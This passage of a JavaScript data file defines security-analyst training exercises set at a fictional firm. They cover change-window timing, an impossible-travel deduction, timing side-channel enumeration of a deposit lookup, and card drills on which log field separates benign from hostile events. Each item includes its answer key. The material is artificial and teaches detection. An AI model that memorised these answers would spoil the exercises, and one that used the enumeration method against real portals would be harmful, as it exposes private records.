          ["CHG0052415", "WX-FS-03", "2026-10-20T01:00:00Z", "2026-10-20T03:00:00Z", "2026-10-20T00:51:48Z"],
          ["CHG0052433", "WX-SQL-01", "2026-10-22T22:00:00Z", "2026-10-22T23:30:00Z", "2026-10-22T23:34:10Z"],
          ["CHG0052470", "WX-APP-03", "2026-10-27T06:30:00Z", "2026-10-27T08:00:00Z", "2026-10-27T06:31:15Z"],
        ],
        questions: [
          { id: "early", q: "How many seconds before its window opened did CHG0052415 run?", hint: "Only the opening time matters. Count up to the next whole minute, then the minutes to the hour.", answer: ["492", "492 seconds"], why: "From 00:51:48 to 01:00:00 is 8 minutes 12 seconds: 8 times 60, plus 12, is 492." },
          { id: "late", q: "How many seconds after its window closed did CHG0052433 run?", hint: "This time the closing time is the one that matters.", answer: ["250", "250 seconds"], why: "From 23:30:00 to 23:34:10 is 4 minutes 10 seconds: 240 plus 10." },
          { id: "inside", q: "Which ticket ran inside its window?", hint: "After the opening time and before the closing time.", answer: ["CHG0052470", "0052470", "52470"], why: "06:31:15 sits inside 06:30 to 08:00. Time is one field among several: being off schedule is something the change board should hear about, and on its own it says nothing about who ran the job or why." },
        ],
      },
    ],
    "edge-ac1": [
      {
        kind: "deduce",
        title: "Which Trip Was a Takeover?",
        prompt: "Six impossible-travel alerts on Wexcombe staff this month, all closed in one click. Story one: the person's traffic took a different route. Story two: someone else has the account. One of them is the second story. Strike the rest out as Ifeoma Larsen reads the clues.",
        primer: {
          title: "What a geolocation actually locates",
          fold: true,
          points: [
            "Impossible travel divides the distance between two sign-ins by the time between them. It assumes each address is where the person is sitting.",
            "A corporate VPN or **SASE** (Secure Access Service Edge) service sends traffic out through a gateway, and that gateway may be in another country. Websites see the gateway.",
            "An **ASN** (Autonomous System Number) identifies the network that owns an address. Its organisation name tells you who runs it: a company, a home broadband firm, a mobile carrier, a hosting provider.",
            "A proxy flag says the address is known to relay traffic. It doesn't say for whom.",
          ],
          example: {
            label: "Two lookups, read as data",
            lines: [
              "`203.0.113.9`: AS64502, Harbour Broadband Ltd. A home connection.",
              "`198.51.100.8`: AS64504, Cumulus Hosting. Rented servers in a data centre.",
            ],
          },
        },
        nameColumn: "User",
        columns: ["Second sign-in", "ASN organisation", "Proxy flag", "VPN client session", "Device"],
        suspects: [
          { id: "kerr", name: "a.kerr", cells: ["Frankfurt", "AS64505 Wexcombe Estates SASE Egress", "true", "Live", "Managed laptop"] },
          { id: "sharma", name: "n.sharma", cells: ["Madrid", "AS64503 Meseta Home Fibre", "false", "None", "Managed phone"] },
          { id: "ward", name: "b.ward", cells: ["Warsaw", "AS64508 Quickhost Cloud Servers", "true", "None", "Unmanaged"] },
          { id: "ross", name: "e.ross", cells: ["Paris", "AS64507 Lutece Mobile", "false", "None", "Managed phone"] },
          { id: "pike", name: "g.pike", cells: ["Oslo", "AS64509 NordHop VPN", "true", "None", "Managed laptop"] },
          { id: "mills", name: "c.mills", cells: ["Frankfurt", "AS64505 Wexcombe Estates SASE Egress", "true", "Live", "Managed laptop"] },
        ],
        clues: [
          "No company VPN client session exists for this user at that minute.",
          "The address isn't on a home or mobile network.",
          "The device isn't one Wexcombe manages.",
        ],
        culprit: "ward",
        why: "b.ward: rented servers, a relay, no client session, and a device Wexcombe has never seen. Look at how little the proxy flag did alone: it reads true on Wexcombe's own gateway, on a commercial VPN and on this hosting address, so the organisation behind the ASN is the field that speaks. n.sharma and e.ross were abroad on a home line and a roaming phone. g.pike ran a personal VPN from a managed laptop, which gets a conversation and a check of what that session did. A named gateway still earns one look at your own list of gateways.",
      },
    ],
    "edge-q3": [
      {
        kind: "worksheet",
        title: "What a Lookup Gives Away",
        prompt: "The last ticket before the sign-off: the tenant portal's 'check your deposit' lookup, closed because every response was a normal 200 and nothing fired. Story one: a tenant typing a reference. Story two: a script learning which references exist. Work it out from the application's own log.",
        primer: {
          title: "When the answer isn't in the answer",
          fold: true,
          points: [
            "A **business-logic attack** uses a feature as designed. No request is malformed, so there is nothing for a signature to match.",
            "**Enumeration** asks one yes-or-no question down a long list, to learn which answers are yes.",
            "A **side channel** is an unintended signal. The visible reply can be identical while the time differs, because the yes path does more work.",
            "The numbers that show it live in the application's own logs: distinct values per source, and timing by outcome.",
          ],
          example: {
            label: "The door intercom at a block of flats",
            lines: [
              "Press a flat number that doesn't exist: 'no answer', after half a second.",
              "Press a real flat: it rings, then 'no answer', after six seconds.",
              "The message never changed. Walk down the panel with a stopwatch and you have a list of occupied flats.",
            ],
          },
        },
        caption: "App log · POST /api/deposit/lookup · source 198.51.100.140 · portal rate limit: 120 a minute",
        columns: ["Time (UTC)", "Reference", "Status", "User-Agent", "Response ms"],
        rows: [
          ["03:10:01", "DEP-40112", "200", "Go-http-client/1.1", "61"],
          ["03:10:03", "DEP-40113", "200", "Go-http-client/1.1", "702"],
          ["03:10:05", "DEP-40114", "200", "Go-http-client/1.1", "58"],
          ["03:10:07", "DEP-40115", "200", "Go-http-client/1.1", "66"],
          ["03:10:09", "DEP-40116", "200", "Go-http-client/1.1", "688"],
          ["03:10:11", "DEP-40117", "200", "Go-http-client/1.1", "59"],
          ["03:10:13", "DEP-40118", "200", "Go-http-client/1.1", "63"],
          ["03:10:15", "DEP-40119", "200", "Go-http-client/1.1", "715"],
        ],
        questions: [
          { id: "slow", q: "How many of these references took the slow path, over 500 ms?", hint: "Read the last column.", answer: ["3", "three"], why: "DEP-40113, 40116 and 40119. The status never changed, and the clock told you which references are real." },
          { id: "status", q: "Could you tell which references exist from the status code alone? (yes/no)", hint: "Read the Status column.", answer: ["no"], why: "Every line is 200, so the status separates nothing here. The split you found came from the clock." },
          { id: "rate", q: "One request every 2 seconds. How many a minute is that?", hint: "60 seconds divided by 2.", answer: ["30", "30 a minute"], why: "30 a minute sits under the limit of 120, and each request is well formed. A default library User-Agent is one hint. Distinct sequential references from one source, with two clusters of response time, are what the application's own log adds." },
        ],
      },
    ],
    // ── Reading 6: the question behind every ticket ──
    "edge-r6": [
      {
        kind: "reactor",
        title: "Where the Proof Lives",
        prompt: "Before Ifeoma Larsen signs, one idea for the whole pile. An event that looks routine gets settled in one of three places: another field in the same record, a trend across many records, or context the log doesn't hold. These are new alerts, none from the pile. Route each one to where its proof lives.",
        reactors: [
          { id: "field", label: "Another field", sub: "In the same record" },
          { id: "trend", label: "A trend", sub: "Across many records" },
          { id: "context", label: "Outside the log", sub: "Something only people know" },
        ],
        items: [
          { id: "p1", text: "A mail passes SPF, and its Reply-To points somewhere else", reactor: "field", why: "Both headers are in the same message." },
          { id: "p2", text: "A scheduled task is named like a Windows update: read its action path", reactor: "field", why: "The action path is in the same event as the name." },
          { id: "p3", text: "One source tries one password each against 300 accounts", reactor: "trend", why: "Each failure is ordinary, and the count across accounts is the finding." },
          { id: "p4", text: "A host calls one address every 300 seconds for a fortnight", reactor: "trend", why: "Any single connection is nothing. The rhythm is visible only across many." },
          { id: "p5", text: "A firewall rule changes at 02:00", reactor: "context", why: "The record shows the change. Whether it was approved lives in the change system." },
          { id: "p6", text: "A facilities intern opens the board's share", reactor: "context", why: "The log has the access. Whether that share fits the role is something people know." },
          { id: "p7", text: "A service account's sign-ins creep up week after week", reactor: "trend", why: "No one week stands out, and the slope does." },
          { id: "p8", text: "A login shows a browser string from a phone, and the device field says server", reactor: "field", why: "Two fields of one record disagree." },
        ],
      },
      {
        kind: "rush",
        title: "Would This Field Differ?",
        prompt: "The question Ifeoma Larsen asks of every closed ticket: what would the malicious version of this exact event look like, and which field would be different? Each card is a detail from Wexcombe's reopened pile. Call it fast: does it tell the two stories apart, or does it fit both?",
        trueLabel: "Tells them apart",
        falseLabel: "Fits both stories",
        seconds: 75,
        target: 11,
        cards: [
          { id: "c1", text: "wexcombe-arrears-report: started by the package manager", answer: false, why: "Every package that night had the same parent." },
          { id: "c2", text: "wexcombe-arrears-report: 31.0.0 from the public side, 2.3.1 on the private server", answer: true, why: "An honest build follows the private line." },
          { id: "c3", text: "wexcombe-arrears-report: it ran at the usual build time", answer: false, why: "The build chose the moment, on that night and every other." },
          { id: "c4", text: "Accounts assistant: the hourly DLP rule stayed silent", answer: false, why: "It stays silent for an idle user and a patient one alike." },
          { id: "c5", text: "Accounts assistant: 12 days in a row above own normal", answer: true, why: "A trend against the person's own baseline." },
          { id: "c6", text: "Repair widget: the rent payment completed", answer: false, why: "The page keeps working in both stories." },
          { id: "c7", text: "Repair widget: a CSP report names a host first seen on Tuesday", answer: true, why: "A new destination from the payment page, seen by the browser." },
          { id: "c8", text: "Lease Clause Finder: the audit log says Consent to application", answer: false, why: "Every consent uses that operation name." },
          { id: "c9", text: "Lease Clause Finder: asks to read every SharePoint site", answer: true, why: "Its job doesn't need that reach." },
          { id: "c10", text: "Lease Clause Finder: the consent page was the real provider's", answer: false, why: "Every consent runs on the provider's own page." },
          { id: "c11", text: "WX-APP-02: Microsoft signed rundll32.exe", answer: false, why: "It signed it for everybody." },
          { id: "c12", text: "WX-APP-02: a first-seen connection straight after the launch", answer: true, why: "What the tool did next, and where to." },
          { id: "c13", text: "b.ward: two sign-ins too far apart to travel", answer: false, why: "A gateway hop produces the same sum." },
          { id: "c14", text: "b.ward: the ASN organisation is a server-hosting firm", answer: true, why: "The field names who runs the network behind the address." },
          { id: "c15", text: "Deposit lookup: every response was HTTP 200", answer: false, why: "One tenant and one script get the same status." },
          { id: "c16", text: "Deposit lookup: response times split into two clusters", answer: true, why: "The timing shows which path each reference took." },
        ],
        lesson: "Every 'fits both' card is something that made a ticket look closed: a normal parent, a silent rule, a good signature, a successful result. None of them can settle the case, however reassuring they read. Before you close something as noise, name the field that would differ in the hostile version, then go and read it. If you can't name that field, you have matched the common case and ruled out nothing.",
      },
    ],
  },
};
